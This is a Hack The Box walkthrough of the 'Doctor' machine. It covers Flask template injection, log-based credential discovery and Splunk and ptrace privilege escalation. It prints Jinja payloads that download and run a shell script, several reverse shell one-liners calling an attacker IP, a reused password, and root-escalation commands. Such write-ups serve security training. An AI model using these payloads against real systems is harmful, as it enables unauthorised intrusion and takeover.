Doctor is an easy Linux box made by [egotisticalSW](https://www.hackthebox.eu/home/users/profile/94858). First on port 80, a email was found leaking a hostname of a webserver which was vulnerable to Server Side Template Injection and a reverse shell was obtained as user __web__ by exploiting this vulnerability. On the box, the user web was a member of group __adm__ which allowed us to read log files and one had a password for another user __shaun__. And finally Splunkd running on port 8089 was exploited to get a shell on the box as root. Alternatively **SYS_PTRACE** Linux Capability on python3.8 was exploited to get a root shell.

### Flags used in nmap

*   -sC for default scripts
*   -sV for enumerating version
*   -oA for saving output in file initial inside nmap directory in all format

Looking at the results, we have three ports open. SSH is open on port 22 running OpenSSH version 8.2p1. HTTP service is running on port 80 running  Apache httpd version 2.4.41 and the banner is telling us that it is a ubuntu box. Another HTTP service is also running on port 8089 which is running Splunkd.
As SSH does not have that much of an attack surface, let's start our enumeration with HTTP service on port 80. 

# Port 80

![1](/assets/images/doctor/1.png)  
  

And on the same page, we see a email id with a hostname.  
  
![2](/assets/images/doctor/2.png)

Lets add this entry to our **/etc/hosts** file.
```console
10.10.10.209   doctors.htb htb
```
### Checking doctors.htb
![3](/assets/images/doctor/3.png)

We are presented with a login page. We do not have any credentials at this point, but we can register a new user.

### Registering user with username **admin**
![4](/assets/images/doctor/4.png)
It means the user with admin already exists. Using this technique, we can enumerate potential usernames on this site if needed.

### Creating new user
![5](/assets/images/doctor/5.png)
And this time, as there was no user with username **admin1**, we can successfully register a user with that username.

### New message
In the navbar, there is a link to send a new message which let us post the new contents.
![6](/assets/images/doctor/6.png)

### Checking the technologies used by webserver using [Wappalyzer](https://www.wappalyzer.com/download/)
![7](/assets/images/doctor/7.png)

The programming language used by the webserver is python and it is hosted using flask, so, the first thing came on my mind was server side template injection.
## Template injection
### Payload
\{\{ 1 + 1 \}\}

If we get 2 in the result that will mean that this expression gets evaluated on the server which means we get code execution.

### Creating new post
![8](/assets/images/doctor/8.png)

![9](/assets/images/doctor/9.png)
But we get the payload as it is.

### Checking the source of the page
So while I was looking around I found a comment on the source code.

![10](/assets/images/doctor/10.png)
We could have found this by using gobuster or any other directory bruteforcing tools.

## Checking /archive
![11](/assets/images/doctor/11.png)

Here we are getting **2** on the title means our code was evaluated on the server, which means we get code execution.

# Shell as web
As we have code execution, we have to find a way to get a reverse shell on the box. I have searched and found [this](https://medium.com/@akshukatkar/rce-with-flask-jinja-template-injection-ea5d0201b870) post on medium for getting a reverse shell.

## Payload Used
```console
[].__class__.__base__.__subclasses__().pop(407)(['wget','10.10.14.18:8000/shell.sh'])
[].__class__.__base__.__subclasses__().pop(407)(['bash','shell.sh'])
```
### Payload Explained
```python
>>> [].__class__
<type 'list'>   
```
This returns the class of a list.

```python
>>> [].__class__.__base__
<type 'object'>
```
This returns the base class of the list.

```python
>>> [].__class__.__base__.__subclasses__()
[<type 'type'>, <type 'weakref'>, <type 'weakcallableproxy'>, <type 'weakproxy'>, <type 'int'>, <type 'basestring'>, <type 'bytearray'>, <type 'list'>, <type 'NoneType'>, <type 'NotImplementedType'>, <type 'traceback'>, <type 'super'>, <type 'xrange'>, <type 'dict'>, <type 'set'>, <type 'slice'>, <type 'staticmethod
...
```
This returns all the subclasses of object class. Now from this list we have to find a class with method that helps us to get a reverse shell on the box.

As this is a list we can access a object using `[index]`.
```python
[].__class__.__base__.__subclasses__()[10]
```
So with trial and error, I finally found a class `Subprocess.Popen` on index number 407.

```python
>>> [].__class__.__base__.__subclasses__()[407]
<class 'subprocess.Popen'>
```
 As explained on the post on medium that I followed, there were issues with this approach and we were not able to execute commands. So the single class is taken out of the list using `pop`.
 ```python
 >>> [].__class__.__base__.__subclasses__()[407]
<class 'subprocess.Popen'>
```
### Final payload
```python
[].__class__.__base__.__subclasses__().pop(407)(['wget','10.10.14.18:8000/shell.sh'])
[].__class__.__base__.__subclasses__().pop(407)(['bash','shell.sh'])
```
Here first of all we will create a file called shell.sh on our local box with content for reverse shell and we will start a web server on port 8000. Then we will download this **shell.sh** file on the remote box using wget and we will execute this file. I went this approach because the usual reverse shell payload have a lot of character with symbols like `<` `>` `|` and `&`. 

### Contents of  shell.sh
```console
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.141 9001 >/tmp/f

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.141",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.141",9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

bash -i >& /dev/tcp/10.10.14.141/9001 0>&1
```
I like to use multiple reverse shell payloads.

### Listening on my box on 9001
```console
local@local:~/Documents/htb/boxes/doctor$ nc -nvlp 9001
Listening on [0.0.0.0] (family 2, port 9001)
Listening on 0.0.0.0 9001
```

### Python server on Port 8000
```console
local@local:~/Documents/htb/boxes/doctor$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

### Updating previous post with new payload
![12](/assets/images/doctor/12.png)

And when we make a request to **/archive**, we get a request on our python server on port 8000 for **shell.sh** file.
```console
local@local:~/Documents/htb/boxes/doctor$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.19.165 - - [28/Sep/2020 23:16:29] "GET /shell.sh HTTP/1.1" 200 -
```
It worked. Now we just have to execute the file.

### Executing shell.sh
![13](/assets/images/doctor/13.png)

And now when we make a request on  **/archive**, we get a connection back on netcat listening on port 9001.
```console
local@local:~/Documents/htb/boxes/doctor$ nc -nvlp 9001
Listening on [0.0.0.0] (family 2, port 9001)
Listening on 0.0.0.0 9001
Connection received on 10.129.19.165 55244
/bin/sh: 0: can't access tty; job control turned off
$ 
```

## Upgrading the shell

```console
$ python3 -c "import pty;pty.spawn('/bin/bash')"
```

Hit `CTRL + z` to background the process.

### On local box
```console
local@local:~/Documents/htb/boxes/doctor$ stty raw -echo
```

Type `fg` to foreground the process and hit enter twice. 

### On reverse shell

```console
web@doctor:~$ export TERM=xterm
```

Now we get a proper shell with autocompletion.

# Privilege Escalation
### Checking the groups of user web
```console
web@doctor:~$ groups
web adm
```
Our current user is in `adm` group which means we can read few extra log files.

### Extracting the content from log files containing word **password**
```console
web@doctor:/var/log$ grep -Ri password 2>/dev/null

```
And there was one particular entry for reseting the password which I found interesting.
```console

```
## Listing the home directory
```console
web@doctor:/var/log$ ls /home
shaun  web
```

As credential reuse is very common, I tried to login to shaun's account with that password.
```console
 web@doctor:/var/log$ su shaun
Password: 
shaun@doctor:/var/log$ 
```
And we are on the box as user shaun.

## Reading user.txt
```console
shaun@doctor:~$ ls
user.txt
shaun@doctor:~$ cat user.txt

# Privilege Escalation to root
There was another port  8089 that was open which was running splunkd from our nmap scan.

## Port 8089
![14](/assets/images/doctor/14.png)

It was running `splunkd` with build no `8.0.5`. So I checked online if there were any publicly available exploits for splunkd and I found [an amazing article](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/) but the only problem is that it was authenticated RCE.

## Checking /service
![15](/assets/images/doctor/15.png)
At first I tried common passwords like `admin:admin`, `admin:password`. Searching on the web, I found that default password for splunk is `admin:changeme`, but this also did not log me in.
And thinking credential reusing is a very common thing, so I tried to login as `shaun:Guitar123`.

![16](/assets/images/doctor/16.png)
And we get in. Now we just have to run the exploit.

It looked like the exploit worked. 

### Checking /dev/shm for new file
```console
shaun@doctor:~$ ls -la /dev/shm
total 0
drwxrwxrwt  2 root root   60 Sep 28 19:52 .
drwxr-xr-x 18 root root 4000 Sep 28 11:11 ..
-rw-------  1 root root    0 Sep 28 19:52 exploit
shaun@doctor:~$ 
```
The file a file with filename **exploit** is created in _/dev/shm_ as root. So the exploit clearly works.

## Getting a shell as root
```console
local@local:~/Documents/htb/boxes/doctor$ python PySplunkWhisperer2_remote.py --host 10.129.19.165 --port 8089 --username shaun --password Guitar123 --payload "cp /bin/bash /tmp/bash && chmod 4777 /tmp/bash" --lhost 10.10.14.141

```
Here I copied the usual **/bin/bash** binary to **/tmp/bash** and changed the file permission to **4777**, which means that it can be executed by everyone on the box and when executed it will be executed as root as the SUID bit is enabled on the binary.
### Checking /tmp 
```console
shaun@doctor:~$ ls -la /tmp/bash
-rwsrwxrwx 1 root root 1183448 Sep 28 19:55 /tmp/bash
```
The file is created and if we look at the files permissions, the SUID bit is enabled too.

### Getting root shell
```console
shaun@doctor:~$ /tmp/bash -p
bash-5.0# id
uid=1002(shaun) gid=1002(shaun) euid=0(root) groups=1002(shaun)
bash-5.0# 
```
And we are root at the effective id **euid** is equal to 0.

## Reading root flag
```console
bash-5.0# cd /root
bash-5.0# ls
root.txt
bash-5.0# cat root.txt
4f86************************4bce
```

# Unintentional way
## Listing all linux Capabilities
```console
shaun@doctor:/dev/shm$ getcap -r / 2>/dev/null
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/python3.8 = cap_sys_ptrace+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```
One particular entry that interested me was `/usr/bin/python3.8` having `cap_sys_ptrace+ep` capability. And I searched around to find if this condition is exploitable to get a root shell and found [this amazing article](https://blog.pentesteracademy.com/privilege-escalation-by-abusing-sys-ptrace-linux-capability-f6e6ad2a59cc) which exploited similar condition to get a root shell and the exploit was available for python2.7. The only thing we have to do is to convert this code so that we can run this exploit using python3.

This exploit creates a bind shell on port 5600.

Now we need a process running as root.
### Listing Processes
```console
shaun@doctor:/home$ ps -ef | grep -i apache
root       16034       1  0 10:36 ?        00:00:00 /usr/sbin/apache2 -k start
www-data   16047   16034  0 10:37 ?        00:00:00 /usr/sbin/apache2 -k start
www-data   16048   16034  0 10:37 ?        00:00:00 /usr/sbin/apache2 -k start
www-data   16049   16034  0 10:37 ?        00:00:00 /usr/sbin/apache2 -k start
www-data   16050   16034  0 10:37 ?        00:00:00 /usr/sbin/apache2 -k start
www-data   16051   16034  0 10:37 ?        00:00:00 /usr/sbin/apache2 -k start
shaun      16057   16036  0 10:37 pts/0    00:00:00 grep --color=auto -i apache
```
Apache with pid 16034 is running as root.

### Running the exploit
```console
shaun@doctor:/dev/shm$ python3.8 exploit.py 16034
Instruction Pointer: 0x7faa72081f4a
Injecting Shellcode at: 0x7faa72081f4a
Shellcode Injected!!
Final Instruction Pointer: 0x7faa72081f4c
```
It looked like it ran successfully.

### Checking for open ports
```console
shaun@doctor:/dev/shm$ ss -lt | grep 5600
LISTEN  0       0                0.0.0.0:5600            0.0.0.0:*  
```
We have a port listening on 5600. Lets connect on the port using nc.

### Getting a root shell
```console
shaun@doctor:/dev/shm$ nc 127.0.0.1 5600
id 
uid=0(root) gid=0(root) groups=0(root)
whoami
root
```
And we get a root shell.
